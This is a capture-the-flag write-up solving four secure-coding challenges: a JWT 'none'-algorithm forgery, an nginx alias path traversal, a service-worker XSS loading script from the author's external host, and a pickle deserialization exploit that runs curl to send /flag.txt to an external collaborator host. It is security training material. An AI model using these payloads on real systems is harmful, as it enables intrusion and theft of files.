# Wizer CTF Event 6 Hour Challenge

<br>

This CTF focuses on secure coding, we are given the source code for each challenge to analyse.

## Challenges

- [JWT Authentication](#jwt-authentication)
- [Nginx Configuration](#nginx-configuration)
- [Recipe Book](#recipe-book)
- [Profile Page](#profile-page)


<br>

## JWT Authentication

<br>

<details><summary markdown="span">Click to see source code :diamond_shape_with_a_dot_inside: </summary>

```js
const express = require('express');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());
const SECRETKEY = process.env.SECRETKEY;

// Middleware to verify JWT token
// This API will be used by various microservices. These all pass in the authorization token.
// However the token may be in various different payloads.
// That's why we've decided to allow all JWT algorithms to be used.
app.use((req, res, next) => {
  const token = req.body.token;

  if (!token) {
    return res.status(401).json({ message: 'Token missing' });
  }

  try {
    // Verify the token using the secret key and support all JWT algorithms
    const decoded = jwt.verify(token, SECRETKEY, { algorithms: ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 
                                                                'RS512', 'ES256', 'NONE', 'ES384', 'ES512',
                                                                'PS256', 'PS384', 'PS512'] });
    
    req.auth = decoded;                                                                                                                      
    next();
  } catch (err) {
    return res.status(403).json({ message: 'Token invalid' });
  }
});
    
// API route protected by our authentication middleware
app.post('/flag', (req, res) => {
  if (req.auth.access.includes('flag')) {
    res.json({ message: 'If you can make the server return this message, then you've solved the challenge!'});
  } else {
    res.status(403).json({ message: '🚨 🚨 🚨 You've been caught by the access control police! 🚓 🚓 🚓' })
  }
});

app.listen(3000, () => {
  console.log(`Server is running on port 3000`);
});
```
</details>

This app will check if the `token` parameter is present in the request body's JSON data.

![image](https://github.com/Aftab700/Writeups/assets/79740895/4d3fca6b-9060-4393-829b-0c6c4e0be122)

If `token` is present it will Verify the JWT token.

![image](https://github.com/Aftab700/Writeups/assets/79740895/de844715-31d1-449b-8ea3-6470007a1f16)

It support all JWT algorithms including `NONE` to verify JWT token, so we can bypass the verification using `NONE` as algorithm. It will accept tokens that have no signature at all.  \
Then it will check if `{"access":"flag"}` is present in jwt payload data.

![image](https://github.com/Aftab700/Writeups/assets/79740895/0000fbad-95fe-49e9-bce5-2f9afc64753a)

now we create jwt token with HEADER (ALGORITHM & TOKEN TYPE): `{"typ":"JWT","alg":"NONE"}` and PAYLOAD (DATA): `{"access":"flag"}` with blank SIGNATURE.

Payload:
```json
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJhY2Nlc3MiOiJmbGFnIn0."}
```

![image](https://github.com/Aftab700/Writeups/assets/79740895/d9bb25fb-df44-4677-8928-23b25caff321)

<br>

## Nginx Configuration

> Through the Shelldon Cooper's flag game website, with the following nginx configuration, get the flag from `flag.html`

<br>

<details><summary markdown="span">Click to see source code :diamond_shape_with_a_dot_inside: </summary>

```bash
user  nginx;
worker_processes  1;
events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;

        location / {  # Allow the index.html file to be read
            root   /usr/share/nginx/html;
            index  index.html;
        }

        location /assets {  # Allow the assets to be read
            alias /usr/share/nginx/html/assets/;
        }

        location = /flag.html {  # The flag file is private
            deny all;
        }

        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   /usr/share/nginx/html;
        }
    }
}
```
</details>

At first, I didn't really know what to do, so I used the CTF Ninja Technique. I googled "nginx configuration ctf" 
and came across the "off-by-slash" vulnerability.

When a Nginx directive does not end with a slash, it is possible to traverse one step up. This incorrect configuration could allow an 
attacker to read file stored outside the target folder.

Here the `location /assets` don't have the trailing slash, so we can read the files in it's parent folder

Nginx alias directive defines a replacement for the specified location. Here `/assets` is alias of `/usr/share/nginx/html/assets/`. \
so `/assets../flag.html` will become `/usr/share/nginx/html/assets/../flag.html` and it will return the contents of `flag.html`.

Payload: 
```shell
https://nginx.wizer-ctf.com/assets../flag.html
```

![image](https://github.com/Aftab700/Writeups/assets/79740895/bc9f3e63-0e08-4e37-8124-36fbd23bf7bd)

<br>

## Recipe Book
> Inject an alert("Wizer")

<br>

<details><summary markdown="span">Click to see source code :diamond_shape_with_a_dot_inside: </summary>

```js
const express = require('express');
const helmet = require('helmet');
const app = express();
const port = 80;

// Serve static files from the 'public' directory
app.use(express.static('public'));
app.use(
    helmet.contentSecurityPolicy({
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", ],
        styleSrc: ["'self'", "'unsafe-inline'", 'maxcdn.bootstrapcdn.com'],
        workerSrc: ["'self'"]
        // Add other directives as needed
      },
    })
  );

// Sample recipe data
const recipes = [
    {
        id: 1,
        title: "Spaghetti Carbonara",
        ingredients: "Pasta, eggs, cheese, bacon",
        instructions: "Cook pasta. Mix eggs, cheese, and bacon. Combine and serve.",
        image: "spaghetti.jpg"
    },
    {
        id: 2,
        title: "Chicken Alfredo",
        ingredients: "Chicken, fettuccine, cream sauce, Parmesan cheese",
        instructions: "Cook chicken. Prepare fettuccine. Mix with cream sauce and cheese.",
        image: "chicken_alfredo.jpg"
    },
    // Add more recipes here
];

// Enable CORS (Cross-Origin Resource Sharing) for local testing
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});

// Endpoint to get all recipes
app.get('/api/recipes', (req, res) => {
    res.json({ recipes });
});

app.listen(port, () => {
    console.log(`API server is running on port ${port}`);
});
```
</details>

Url: https://events.wizer-ctf.com/

In the webpage there is a `https://events.wizer-ctf.com/app.js`. when we analyse it, we notice that it will 
Get the "mode" and "color" GET parameters from url and assign it to `modeParam` and `colorParam`

![image](https://github.com/Aftab700/Writeups/assets/79740895/936de271-6404-49a8-bea8-d31955f758c5)

Then it will set `document.getElementById("mode").children[0].id = modeParam;` and \
`document.getElementById(modeParam).textContent = colorParam;`

![image](https://github.com/Aftab700/Writeups/assets/79740895/2d739476-0e09-4815-b9b5-fd90f25d9b92)


![image](https://github.com/Aftab700/Writeups/assets/79740895/9545e376-5829-4001-9c7a-5ee1ff4a22fb)


Here if we put GET parameter `mode=sw` then we can control the value of `const sw` it will be what we give in GET parameter `color`.

explanation: 

Parameter Retrieval:
- `modeParam = searchParams.get('mode')`:  
  1. Stores the value of the query parameter named `mode` in the `modeParam` variable.

- `colorParam = searchParams.get("color")`:
  1. Similarly, retrieves the value of the `color` parameter and stores it in `colorParam`.

Element Updates:
- `document.getElementById("mode").children[0].id = modeParam;`:
  1. Finds the element with the ID "mode" and targets its first child element.
  2. Sets the id attribute of the child element to the value of `modeParam`.

- `document.getElementById(modeParam).textContent = colorParam;`:
  1. Uses the value of `modeParam` to look up an element by its ID
  2. Sets the textContent of that element to the value of `colorParam`.

Service Worker Registration:
- `sw = document.getElementById('sw').innerText;`:
  1. Retrieves the innerText (text content) of the element with the ID "sw".
  2. Stores the retrieved content in the `sw` variable.


`https://events.wizer-ctf.com/sw.js?sw=` have the following code

```js
// Allow loading in of service workers dynamically
importScripts('/utils.js');
importScripts(`/${getParameterByName('sw')}`);
```

It will import the serviceWorker from the value of `sw` since we can control it we can import our own serviceWorker with `sw=\\atacker.com/sw.js`. \
This will get the file from `https://atacker.com/sw.js`

now to craft our serviceWorker take a look at this

![image](https://github.com/Aftab700/Writeups/assets/79740895/32e8eeae-7d95-4513-bead-2c04a566bb6e)


this will listen for message event on BroadcastChannel('recipebook') and it will alert the `message` property of a message.

BroadcastChannel enables communication between different windows, tabs, or workers within the same origin. postMessage() method will trigger the 'message' event on other instances of the BroadcastChannel with the same name.

so in serviceWorker we create a new BroadcastChannel instance using the same name ('recipebook'): \
`const channel = new BroadcastChannel('recipebook');` \
Use the postMessage() method on the BroadcastChannel instance to send a message with a message property: \
`channel.postMessage({ message: 'Wizer' });`

serviceWorker payload:
```js
const channel = new BroadcastChannel('recipebook');
channel.postMessage({ message: 'Wizer' });
```

upload this file publicaly on internet: [https://aftab700.pythonanywhere.com/api/xss](https://aftab700.pythonanywhere.com/api/xss)

Payload:
```shell
https://events.wizer-ctf.com/?mode=sw&color=\\aftab700.pythonanywhere.com/api/xss
```

![image](https://github.com/Aftab700/Writeups/assets/79740895/69c5ccec-add7-4347-9f4e-3537df332f21)

<br>

## Profile Page
> Get the flag and submit it here (https://dsw3qg.wizer-ctf.com/submit_flag/<flag>) to win the challenge! (profile page: https://dsw3qg.wizer-ctf.com/profile)

<br>

<details><summary markdown="span">Click to see source code :diamond_shape_with_a_dot_inside: </summary>

```python
from flask import Flask, request, render_template
import pickle
import base64

app = Flask(__name__, template_folder='templates')
real_flag = ''
with open('/flag.txt') as flag_file:
    real_flag = flag_file.read().strip()

class Profile:
    def __init__(self, username, email, bio):
        self.username = username
        self.email = email
        self.bio = bio

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        bio = request.form.get('bio')

        if username and email and bio:
            profile = Profile(username, email, bio)
            dumped = base64.b64encode(pickle.dumps(profile)).decode()
            return render_template('profile.html', profile=profile, dumped=dumped)    

    load_object = request.args.get('load_object')
    if load_object:
        try:
            profile = pickle.loads(base64.b64decode(load_object))
            return render_template('profile.html', profile=profile, dumped=load_object)
        except pickle.UnpicklingError as e:
            return f"Error loading profile: {str(e)}", 400

    return render_template('input.html')

@app.route('/submit_flag/<flag>', methods=['GET'])
def flag(flag):
    return real_flag if flag == real_flag else 'Not correct!'

if __name__ == '__main__':
    app.run(debug=True)
```
</details>

![image](https://github.com/Aftab700/Writeups/assets/79740895/e1a9a542-c019-45ff-8f29-1901a0346a4c)


Here if GET parameter `load_object` is present it will pass it to `pickle.loads(base64.b64decode(load_object))`. 

`pickle.loads()` is used to unpickle (deserialize) the data and takes a variable containing byte stream as a valid argument.

It is vulnerable to pickle insecure deserialization.

To exploit this vulnerability, we will use `__reduce__` method. \
`__reduce__` allows you to define a custom way to reconstruct the object during deserialization. It can be used for execution of arbitrary 
code during deserialization

I wasted so much time on payload making because i was using `os.system` but it didn't work at last `subprocess.Popen` worked

python exploit code:

```python
import pickle
import base64
import os
import requests


class RCE:
    def __reduce__(self):
        import os
        import subprocess
        return (subprocess.Popen, (('curl','bwb2r04nf32cz2y75mho7eus4jaay8mx.oastify.com', '-d', '@/flag.txt'),0))

pickled = pickle.dumps(RCE())
x2 = base64.b64encode(pickled).decode()

r = requests.get(f"https://dsw3qg.wizer-ctf.com/profile?load_object={x2}",proxies={'http':'http://127.0.0.1:8080'})
print(r.text)
```

Request to collaborator:

![image](https://github.com/Aftab700/Writeups/assets/79740895/9dc22cfa-ffd1-4156-a89c-11fdb5bfa81c)


Payload:
```shell
https://dsw3qg.wizer-ctf.com/submit_flag/WIZER{'PICKL1NG_1S_DANGEROUS'}
```

<br>

:octocat: Happy Hacking :octocat:
